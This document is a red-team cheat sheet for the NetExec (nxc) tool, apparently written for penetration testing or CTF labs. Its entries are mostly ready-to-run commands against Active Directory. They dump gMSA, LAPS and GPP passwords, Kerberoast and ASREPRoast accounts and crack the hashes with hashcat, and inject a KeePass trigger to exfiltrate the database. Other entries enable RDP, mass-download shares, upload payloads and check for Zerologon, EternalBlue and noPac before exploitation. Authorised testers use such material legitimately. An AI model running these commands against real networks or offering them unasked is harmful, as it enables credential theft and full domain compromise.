# NetExec (nxc) — Enumeration & Domain Modules

## LDAP Enumeration

### GMSA Password Dump [added: 2026-04]
- **Tags:** #nxc #GMSA #ManagedServiceAccount #PasswordDump #ServiceAccount #T1555
- **Trigger:** gMSA accounts discovered during AD enumeration
- **Prereq:** Valid domain credentials with read access to gMSA password (PrincipalsAllowedToRetrieve)
- **Yields:** gMSA password hash for service account impersonation
- **Opsec:** Low
- **Context:** Enumerate and retrieve Group Managed Service Account passwords.
- **Payload/Method:** `nxc ldap <target> -u <u> -p <p> --gmsa`

### LAPS Password Retrieval [added: 2026-04]
- **Tags:** #nxc #LAPS #LocalAdmin #PasswordRetrieval #MicrosoftLAPS #T1555
- **Trigger:** LAPS deployed in domain; checking for readable LAPS passwords
- **Prereq:** Valid domain credentials with LAPS read permission on target computer objects
- **Yields:** Local admin passwords for LAPS-managed machines
- **Opsec:** Low
- **Context:** Read LAPS passwords for machines the account has access to.
- **Payload/Method:** `nxc ldap <target> -u <u> -p <p> -M laps`

### Machine Account Quota [added: 2026-04]
- **Tags:** #nxc #MachineAccountQuota #MAQ #RBCD #noPac #ComputerCreation #T1136
- **Trigger:** Planning RBCD or NoPac attack; need to verify machine account creation ability
- **Prereq:** Valid domain credentials; LDAP access to DC
- **Yields:** ms-DS-MachineAccountQuota value (number of machine accounts user can create)
- **Opsec:** Low
- **Context:** Check if user can add machine accounts (for RBCD/noPac attacks).
- **Payload/Method:** `nxc ldap <target> -u <u> -p <p> -M maq`

### DACL Read (ACL Enumeration) [added: 2026-04]
- **Tags:** #nxc #DACL #ACLEnum #daclread #DCSync #PermissionCheck #T1222
- **Trigger:** Need to check specific permissions on AD objects for abuse paths
- **Prereq:** Valid domain credentials; LDAP access to DC
- **Yields:** ACL entries on target object showing who has modification/dangerous rights
- **Opsec:** Low
- **Context:** Read all ACEs on a target object to find abusable permissions.
- **Payload/Method:**
  ```
  nxc ldap <target> -u <u> -p <p> -M daclread -o TARGET=<username> ACTION=read
  nxc ldap <target> -u <u> -p <p> -M daclread -o TARGET_DN=<DN> ACTION=read RIGHTS=DCSync
  ```

### Trusted-for-Delegation Enumeration [added: 2026-04]
- **Tags:** #nxc #UnconstrainedDelegation #TrustedForDelegation #DelegationEnum #TGTCapture #T1558
- **Trigger:** Mapping delegation configurations for credential theft attacks
- **Prereq:** Valid domain credentials; LDAP access to DC
- **Yields:** List of users/computers with unconstrained delegation flag (TGT caching targets)
- **Opsec:** Low
- **Context:** Find users/computers with unconstrained delegation flag.
- **Payload/Method:** `nxc ldap <target> -u <u> -p <p> --trusted-for-delegation`

### PASSWD_NOTREQD Users [added: 2026-04]
- **Tags:** #nxc #PASSWD_NOTREQD #EmptyPassword #UAC #WeakAccounts #T1087
- **Trigger:** Looking for accounts that might have empty or weak passwords
- **Prereq:** Valid domain credentials; LDAP access to DC
- **Yields:** Accounts with PASSWD_NOTREQD flag (can have empty passwords)
- **Opsec:** Low
- **Context:** Find accounts that can have empty passwords.
- **Payload/Method:** `nxc ldap <target> -u <u> -p <p> --password-not-required`

### AdminCount Objects [added: 2026-04]
- **Tags:** #nxc #AdminCount #AdminSDHolder #HighValue #PrivilegedAccounts #T1069.002
- **Trigger:** Identifying high-value targets for credential attacks
- **Prereq:** Valid domain credentials; LDAP access to DC
- **Yields:** List of objects with adminCount=1 (protected/high-value accounts)
- **Opsec:** Low
- **Context:** Enumerate objects with adminCount=1 (protected/high-value accounts).
- **Payload/Method:** `nxc ldap <target> -u <u> -p <p> --admin-count`

### Network/DNS Information [added: 2026-04]
- **Tags:** #nxc #DNS #NetworkInfo #IPEnum #DomainRecon #T1018
- **Trigger:** Need DNS and IP information for all domain objects during initial recon
- **Prereq:** Valid domain credentials; LDAP access to DC
- **Yields:** DNS and IP information for all domain objects
- **Opsec:** Low
- **Context:** Get DNS and IP information for all domain objects.
- **Payload/Method:** `nxc ldap <target> -u <u> -p <p> -M get-network -o ALL=true`

---

## Kerberos Attacks via LDAP

### ASREPRoast via nxc [added: 2026-04]
- **Tags:** #nxc #ASREPRoast #ASREP #NoPreAuth #hashcat #OfflineCracking #T1558.004
- **Trigger:** Need to find and extract AS-REP hashes for users without pre-auth
- **Prereq:** Valid domain credentials; LDAP access to DC
- **Yields:** AS-REP hashes for offline cracking from accounts without pre-authentication
- **Opsec:** Low
- **Context:** Find and extract AS-REP hashes for users without pre-auth.
- **Payload/Method:**
  ```
  nxc ldap <target_fqdn> -u <u> -p <p> --asreproast asreproast.out
  hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt --force
  ```

### Kerberoasting via nxc [added: 2026-04]
- **Tags:** #nxc #Kerberoasting #TGS #SPN #hashcat #ServiceAccounts #T1558.003
- **Trigger:** Need to extract TGS hashes for service accounts via nxc
- **Prereq:** Valid domain credentials; LDAP access to DC
- **Yields:** TGS hashes for service accounts for offline cracking
- **Opsec:** Med
- **Context:** Extract TGS hashes for service accounts.
- **Payload/Method:**
  ```
  nxc ldap <target_fqdn> -u <u> -p <p> --kerberoasting kerberoasting.out
  hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt --force
  ```

---

## Domain Enumeration Modules

### GPP Password Recovery [added: 2026-04]
- **Tags:** #nxc #GPP #GroupPolicyPreferences #cpassword #LegacyCreds #T1552.006
- **Trigger:** Checking for legacy GPP credentials in SYSVOL
- **Prereq:** Valid domain credentials; SMB access to DC SYSVOL
- **Yields:** Plaintext passwords from Group Policy Preferences (legacy but still found)
- **Opsec:** Low
- **Context:** Extract plaintext passwords from Group Policy Preferences (legacy but still found).
- **Payload/Method:** `nxc smb <target> -u <u> -p <p> -M gpp_password`

### GPP Autologin Recovery [added: 2026-04]
- **Tags:** #nxc #GPP #Autologin #RegistryXML #StoredCreds #T1552.006
- **Trigger:** Checking for autologin credentials in SYSVOL registry.xml
- **Prereq:** Valid domain credentials; SMB access to DC SYSVOL
- **Yields:** Autologin credentials stored in SYSVOL registry.xml
- **Opsec:** Low
- **Context:** Find autologin credentials stored in registry.xml on SYSVOL.
- **Payload/Method:** `nxc smb <target> -u <u> -p <p> -M gpp_autologin`

### KeePass Discovery + Trigger Attack [added: 2026-04]
- **Tags:** #nxc #KeePass #TriggerInjection #DatabaseExfil #PasswordManager #T1555.005
- **Trigger:** KeePass detected on target during software enumeration
- **Prereq:** Admin access on target; KeePass installed on target
- **Yields:** KeePass database exfiltration via trigger injection (captures on next DB open)
- **Opsec:** Med
- **Context:** Find KeePass config on target, then exfiltrate the database via trigger injection.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> -M keepass_discover
  nxc smb <target> -u <u> -p <p> -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=<PATH>
  ```

### Enable/Disable RDP [added: 2026-04]
- **Tags:** #nxc #RDP #EnableRDP #RemoteDesktop #GUIAccess #T1021.001
- **Trigger:** Need GUI access on target; RDP currently disabled
- **Prereq:** Admin credentials on target; SMB access
- **Yields:** RDP enabled on target for follow-up GUI access
- **Opsec:** Med
- **Context:** Enable RDP on target for follow-up GUI access.
- **Payload/Method:** `nxc smb <target> -u <u> -p <p> -M rdp -o ACTION=enable`

---

## File Operations & Share Spidering

### Spider Shares with Pattern/Regex [added: 2026-04]
- **Tags:** #nxc #ShareSpider #FileSearch #PatternMatch #SensitiveFiles #T1083
- **Trigger:** Shares enumerated; searching for sensitive files (configs, passwords, keys)
- **Prereq:** Valid domain credentials with read access to shares
- **Yields:** Files matching patterns in shares (configs, passwords, keys, certificates)
- **Opsec:** Med
- **Context:** Search shares for sensitive files (configs, passwords, keys).
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> --spider <share> --pattern "pass"
  nxc smb <target> -u <u> -p <p> --spider <share> --regex ".*\.(kdbx|pfx|key|pem)"
  nxc smb <target> -u <u> -p <p> --spider <share> --content --pattern "password"
  ```

### Spider Plus — Full Share Enumeration + Mass Download [added: 2026-04]
- **Tags:** #nxc #SpiderPlus #ShareEnum #MassDownload #DataExfil #FileMapping #T1083
- **Trigger:** Need complete file mapping across all shares or mass download
- **Prereq:** Valid domain credentials with read access to shares
- **Yields:** Complete file listing across all shares; optionally download all files
- **Opsec:** High
- **Context:** Map all files across all shares, or download everything.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
  nxc smb <target> -u <u> -p <p> -M spider_plus -o READ_ONLY=false   # Download all files
  ```

### File Get/Put via SMB [added: 2026-04]
- **Tags:** #nxc #FileTransfer #SMBGet #SMBPut #FileOps #DataExfil #T1105
- **Trigger:** Need to transfer files to/from target via SMB shares
- **Prereq:** Valid credentials with read/write access to target share
- **Yields:** File transfer to/from target shares (upload payloads, download loot)
- **Opsec:** Med
- **Context:** Transfer files to/from target shares.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> --share C$ --get-file Users\\Admin\\Desktop\\flag.txt ./flag.txt
  nxc smb <target> -u <u> -p <p> --share C$ --put-file ./payload.exe Windows\\Temp\\payload.exe
  ```

---

## RDP Enumeration

### RDP Screenshot (NLA Bypass) [added: 2026-04]
- **Tags:** #nxc #RDP #Screenshot #NLABypass #LoginScreen #VisualRecon #T1021.001
- **Trigger:** RDP port 3389 open; NLA disabled; want to capture login screen
- **Prereq:** RDP port open on target; NLA disabled (for unauthenticated screenshot)
- **Yields:** Screenshot of RDP login screen (visual recon without valid credentials)
- **Opsec:** Low
- **Context:** If NLA is disabled, capture login screen without valid creds.
- **Payload/Method:**
  ```
  nxc rdp <target> -u <u> -p <p> --nla-screenshot
  nxc rdp <target> -u <u> -p <p> --screenshot --screentime 10 --res 1920x1080
  ```

---

## Vulnerability Scanning

### Coercion & Critical CVE Checks [added: 2026-04]
- **Tags:** #nxc #Zerologon #PetitPotam #EternalBlue #noPac #CVEScan #VulnCheck #T1190
- **Trigger:** Initial assessment of DC/host for critical vulnerabilities before exploitation
- **Prereq:** Network access to target; optionally valid domain credentials
- **Yields:** Quick check for critical CVEs (Zerologon, EternalBlue, noPac, PetitPotam, DFSCoerce)
- **Opsec:** Med
- **Context:** Quick pre-exploitation checks against DCs/hosts.
- **Payload/Method:**
  ```
  nxc smb <DC> -M Zerologon                                    # CVE-2020-1472
  nxc smb <DC> -M PetitPotam                                   # NTLM coercion
  nxc smb <DC> -M ms17-010                                     # EternalBlue
  nxc smb <DC> -u <u> -p <p> -M nopac                          # CVE-2021-42278/42287
  nxc smb <DC> -u <u> -p <p> -M dfscoerce                      # DFS coercion
  nxc smb <target> -u <u> -p <p> -M shadowcoerce               # Shadow coercion
  ```

---

## nxcDB — Credential & Host Database

### Database Management [added: 2026-04]
- **Tags:** #nxc #nxcDB #CredentialDB #HostDB #DataManagement #CredExport #T1087
- **Trigger:** Need to query previously stored credentials and host info from nxc runs
- **Prereq:** Previous nxc scans with stored results
- **Yields:** Centralized view of all captured credentials, compromised hosts, and enumerated shares
- **Opsec:** Low
- **Context:** Query nxc's built-in database for stored credentials and host info.
- **Payload/Method:**
  ```
  nxcdb
  > workspace list                                # List workspaces
  > proto smb                                     # Switch to SMB protocol DB
  > creds                                         # All creds
  > creds plaintext                               # Only plaintext
  > creds hash                                    # Only hashes
  > hosts                                         # Compromised hosts
  > shares                                        # Enumerated shares
  > export creds detailed creds_export.txt        # Export credentials
  ```

---

## Output & Export

### JSON Export [added: 2026-04]
- **Tags:** #nxc #JSONExport #OutputParsing #Scripting #DataExport #Automation
- **Trigger:** Need nxc output in JSON format for scripting or parsing
- **Prereq:** Previous nxc scan results
- **Yields:** JSON-formatted output for programmatic parsing (jq, python, etc.)
- **Opsec:** Low
- **Context:** Export nxc output for scripting/parsing.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> --shares --export shares.txt
  sed -i "s/'/\"/g" shares.txt    # Fix quotes for jq
  ```
